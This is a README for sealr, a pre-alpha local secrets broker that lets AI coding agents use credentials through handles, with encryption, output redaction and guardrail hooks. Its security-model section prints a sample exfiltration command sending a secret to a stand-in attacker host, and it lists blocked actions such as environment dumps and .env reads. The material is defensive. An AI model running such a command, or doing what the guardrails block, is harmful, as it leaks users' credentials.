<h1 align="center">sealr</h1>

<p align="center">
  <b>Let AI coding agents use your secrets without ever seeing them.</b><br>
  A tiny local secrets broker for Claude Code and other agents: one static binary, no daemon to babysit, no cloud.
</p>

<p align="center">
  <img alt="status" src="https://img.shields.io/badge/status-pre--alpha-orange">
  <img alt="platforms" src="https://img.shields.io/badge/platforms-linux%20%7C%20macOS-blue">
  <img alt="language" src="https://img.shields.io/badge/built%20with-Rust-dea584">
  <img alt="size" src="https://img.shields.io/badge/binary-%E2%89%A42%20MB-green">
</p>

> **Status:** sealr is under active development and not ready for use yet. This README describes the v1 behavior.
> Commands and flags may change before the first release.

---

## The problem

Today, giving an agent a credential means pasting it into the chat or letting it read your `.env`. Either way the
secret ends up in the model's context. It gets sent to the provider, saved in transcripts and session logs, and can be
echoed back in any later tool output.

## The idea

The agent works with **handles** like `stripe/live`, never with values.

```text
You:    "List my Stripe customers using {{sealr:stripe/live}}"
Agent:  curl https://api.stripe.com/v1/customers -u {{sealr:stripe/live}}:
sealr:  ↳ rewritten to  sealr run -- curl … -u "$SEALR_STRIPE_LIVE":
        ↳ value injected into that one child process only
        ↳ output streamed through the redactor
Agent sees: {"data":[…], "api_key": "‹sealr:stripe/live›"}
```

The value is decrypted only inside the child process that needs it. Anything that process prints is redacted
before the agent reads it.

## Features

- 🔐 **Encrypted local vault.** XChaCha20-Poly1305 per entry, Argon2id key derivation, envelope encryption.
  Uses audited RustCrypto crates only.
- 🧷 **Handles, not values.** Use `{{sealr:<handle>}}` in commands, or map handles to env vars once per project.
- 🚫 **Never in argv.** Secrets are injected as env vars of the child process, so they don't show up in `ps` or `/proc/*/cmdline`.
- 🧹 **Streaming redactor.** Catches raw, base64 (std/url, every alignment), hex, percent-encoded and JSON-escaped
  forms, including matches split across output chunks. Also flags unknown key-shaped tokens (AWS, GitHub,
  Stripe, JWT, PEM).
- 🛡️ **Guardrails.** Blocks `env`/`printenv` dumps, reads of `.env` or the vault, pasted secrets in prompts, and
  secret values written into source files.
- ✋ **Per-secret policy.** Restrict which commands may use a secret, or require approval through the agent's own
  permission dialog.
- 🔒 **Seal/unseal.** Works like `ssh-agent`: unseal once per session; it auto-seals on TTL, idle timeout or command. Keys stay in
  locked, zeroized memory.
- 🧾 **Tamper-evident audit log.** Records which handles were used, by which command (hashed), and the result. It never records values.
- 🪶 **Small and fast.** Single static binary ≤ 2 MB, ≤ 5 MB RAM when idle, hooks under 30 ms, zero agent tokens on the
  happy path.
- 🤝 **Works with lean-ctx.** Detects it automatically and composes with it, redacting before anything is compressed or cached.

---

## Install

**Prebuilt binaries** (from the first release on). Static binaries for Linux (x86_64, arm64) and macOS (Intel, Apple
Silicon) are attached to each [GitHub release](https://github.com/DiyRex/keygent/releases), with `SHA256SUMS`
signed by Sigstore:

```sh
# pick your target: x86_64-unknown-linux-musl | aarch64-unknown-linux-musl | aarch64-apple-darwin | x86_64-apple-darwin
VER=v0.1.0 TARGET=aarch64-apple-darwin
curl -LO https://github.com/DiyRex/keygent/releases/download/$VER/sealr-$VER-$TARGET.tar.gz
curl -LO https://github.com/DiyRex/keygent/releases/download/$VER/SHA256SUMS
curl -LO https://github.com/DiyRex/keygent/releases/download/$VER/SHA256SUMS.sigstore.json

# verify signature + checksum
cosign verify-blob SHA256SUMS --bundle SHA256SUMS.sigstore.json \
  --certificate-identity-regexp '^https://github.com/DiyRex/keygent/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
shasum -a 256 --ignore-missing -c SHA256SUMS

tar xzf sealr-$VER-$TARGET.tar.gz && install -m 0755 sealr-$VER-$TARGET/sealr ~/.local/bin/sealr
```

**From source** (requires Rust stable):

```sh
git clone https://github.com/DiyRex/keygent.git && cd keygent
cargo build --release --locked
install -m 0755 target/release/sealr ~/.local/bin/sealr
```

## Quickstart (60 seconds)

```sh
sealr init                    # create your encrypted vault and choose a passphrase
sealr add stripe/live         # paste the value here, in YOUR terminal (never in the chat)
sealr integrate claude        # install the Claude Code hooks + skill
sealr unseal                  # unlock for this session (default TTL 8h)
```

Now, in Claude Code:

> *"List my Stripe customers using {{sealr:stripe/live}}"*

The agent runs the command and gets the results. The key never appears in the transcript.

---

## Usage guide

### 1. Manage the vault

```sh
sealr init                    # create the vault (~/.local/share/sealr/vault.slr, mode 0600)
sealr unseal [--ttl 8h]       # unlock: starts the background agent holding the key in locked memory
sealr status                  # sealed/unsealed, time left, number of handles
sealr seal                    # lock now: key wiped from memory
sealr rekey                   # change passphrase / key slots
sealr backup <file>           # encrypted backup
sealr restore <file>
```

While the vault is sealed, any command that needs a secret stops with:

```text
sealr: vault sealed — ask the user to run 'sealr unseal'
```

### 2. Add and manage secrets (you, not the agent)

These commands need a real terminal. They refuse to run inside an agent session.

```sh
sealr add stripe/live --env STRIPE_API_KEY --desc "Stripe live key"
sealr edit stripe/live        # change metadata or policy
sealr rotate stripe/live      # replace the value, keep the handle
sealr rm stripe/live
sealr import .env [--shred]   # bulk import; --shred securely deletes the .env afterwards
sealr reveal stripe/live      # show the value (re-auth required, never works under an agent)
```

```sh
sealr ls
# stripe/live   STRIPE_API_KEY                  "Stripe live key"
# gcp/sa        GOOGLE_APPLICATION_CREDENTIALS  "GCP service account" (file)
```

`sealr ls` shows handles and env var names only. It is safe for agents to run.

### 3. Use secrets in commands

**Option A: placeholders.** Put the placeholder anywhere in a command:

```sh
sealr run -- curl -u {{sealr:stripe/live}}: https://api.stripe.com/v1/customers
```

The placeholder becomes `"$SEALR_STRIPE_LIVE"`. The value lives only in that child's environment.

**Option B: project manifest.** Commit a `.sealr.toml` to your repo. It holds no values, only names:

```toml
[secrets]
"stripe/live" = { env = "STRIPE_API_KEY" }
"gcp/sa"      = { env = "GOOGLE_APPLICATION_CREDENTIALS", file = true }  # written to a private temp file, deleted on exit
```

```sh
sealr manifest init
sealr manifest add stripe/live --env STRIPE_API_KEY
sealr run -- stripe customers list          # STRIPE_API_KEY is set for this command only
```

Machine-wide handles go in `~/.config/sealr/global.toml`. Project entries take precedence. Lookup stops at a nested `.git`, so
vendored repos never inherit your secrets.

With the Claude Code integration installed you never type `sealr run` yourself. The hook wraps matching commands
automatically.

### 4. Capture a newly minted secret

For commands that **produce** a credential:

```sh
sealr capture aws/session -- aws sts get-session-token --output json --select Credentials.SessionToken
# stored aws/session (env AWS_SESSION_TOKEN)
```

The value is stored straight into the vault and never printed.

### 5. Per-secret policy

Edit with `sealr edit <handle>`:

```toml
allow_cmds = ["stripe *", "curl https://api.stripe.com/*"]   # only these commands may use it
mode       = "ask"     # allow | ask | deny. "ask" uses Claude Code's own approval dialog
max_uses   = 0         # 0 = unlimited per unseal session
ttl        = "8h"
```

### 6. Claude Code integration

```sh
sealr integrate claude              # user scope (~/.claude/settings.json)
sealr integrate claude --project    # this repo only (.claude/settings.local.json)
sealr integrate claude --remove     # undo exactly what was added
sealr doctor                        # verify hooks, version support, vault state
```

This installs:

| Hook | What it does |
|---|---|
| `UserPromptSubmit` | Blocks prompts that contain a secret and tells you to `sealr add` it instead. Prefix `!!` to override; the handle is then marked as exposed. |
| `PreToolUse` · Bash | Wraps commands that use placeholders or manifest handles in `sealr run --`. Blocks env dumps and other reveal commands. |
| `PreToolUse` · Write/Edit | Blocks writing a secret value into a file. |
| `PreToolUse` · Read/Grep/Glob | Blocks reads of the vault, `.env*` and key files. |
| `PostToolUse` | A second redaction pass over all tool output. |

It also installs a tiny skill so the agent knows how to use handles. That costs about 25 words of context until it is used. It does not use MCP by default, so no per-turn token overhead.

### 7. lean-ctx

If lean-ctx is installed, sealr detects it and composes with it:

```sh
sealr integrate lean-ctx            # add sealr to lean-ctx's allowlist + secret-path rules
sealr integrate lean-ctx --remove
```

sealr always runs **innermost** (`lean-ctx -c "sealr run -- …"`). Output is redacted before lean-ctx compresses or caches
it.

### 8. Audit and exposure

```sh
sealr audit --since 24h       # who used what, when, with what result (values never logged)
sealr exposed                 # handles that leaked or were overridden: rotate these
```

Every run that uses an exposed handle prints a one-line reminder to `sealr rotate` it.

---

## Command reference

| Area | Commands |
|---|---|
| Vault | `init` · `unseal [--ttl]` · `seal` · `status` · `rekey` · `backup` · `restore` |
| Secrets (human, TTY only) | `add` · `edit` · `rm` · `rotate` · `import` · `reveal` |
| Agent-safe | `ls` · `run -- <cmd>` · `capture <handle> -- <cmd>` · `check` |
| Project | `manifest init` · `manifest add <handle> [--env NAME] [--file]` |
| Integration | `integrate claude [--remove]` · `integrate lean-ctx [--remove]` · `doctor` |
| Audit | `audit [--since]` · `exposed` |
| Optional | `mcp`: stdio MCP server for agents without hooks |

### Exit codes

| Code | Meaning |
|---|---|
| child's code | `sealr run` passes through the command's exit code |
| `77` | denied by policy |
| `78` | vault sealed |

### Files

| Path | Purpose |
|---|---|
| `$XDG_DATA_HOME/sealr/vault.slr` | encrypted vault (0600) |
| `$XDG_RUNTIME_DIR/sealr.sock` | agent socket (0600, peer uid checked) |
| `$XDG_CONFIG_HOME/sealr/global.toml` | machine-wide manifest |
| `$XDG_STATE_HOME/sealr/audit.jsonl` | HMAC-chained audit log |
| `.sealr.toml` | per-project manifest (safe to commit) |

---

## Security model

**What sealr protects against:**

- an agent reading `.env` or the vault
- an agent printing the environment
- secrets echoed in command output, in common encodings
- you accidentally pasting a secret into the chat
- an agent writing a secret into source code
- secrets in argv
- secrets in hook payloads and transcripts
- other local users reaching the agent socket

**What it can't fully prevent.** Redaction is defense-in-depth, not a guarantee:

- A command that *uses* a secret can send it anywhere (`curl attacker.example -H "$KEY"`). Use `allow_cmds` and `ask`
  mode for sensitive handles.
- Arbitrary transformations (reversing, XOR, splitting across lines) defeat pattern matching.
- Malware running as your own user may read process memory where OS hardening is unavailable.
- Prompt injection can try to steer the agent into exfiltration. Policy and `ask` mode are the defense.

If a secret ever shows up somewhere it shouldn't, rotate it at the provider and run `sealr rotate`.

---

## FAQ

**Does my secret go to the model provider?** No. Only handles and redacted output reach the agent.

**Do I need to keep a server running?** No. `sealr unseal` starts a small background agent, like `ssh-agent`, that exits
when the vault seals.

**Which agents are supported?** Claude Code in v1. Codex, Cursor, Gemini CLI and opencode adapters are planned. Agents
without hooks can use the optional MCP mode.

**Can I use 1Password, Vault or AWS Secrets Manager?** External backends are planned after v1.

## Roadmap

- [ ] v1: local vault, `run`/`capture`, redactor, Claude Code hooks, lean-ctx composition
- [ ] OS keychain unlock, auto-seal on screen lock, Shamir unseal for shared machines
- [ ] Egress proxy (credentials injected per host, so the child never holds the value)
- [ ] Windows, more agent adapters, external secret backends

## Contributing

Issues and PRs are welcome once the first release is out. Never include real secrets in issues, tests or logs.
Use generated canaries.

## License

TBD.
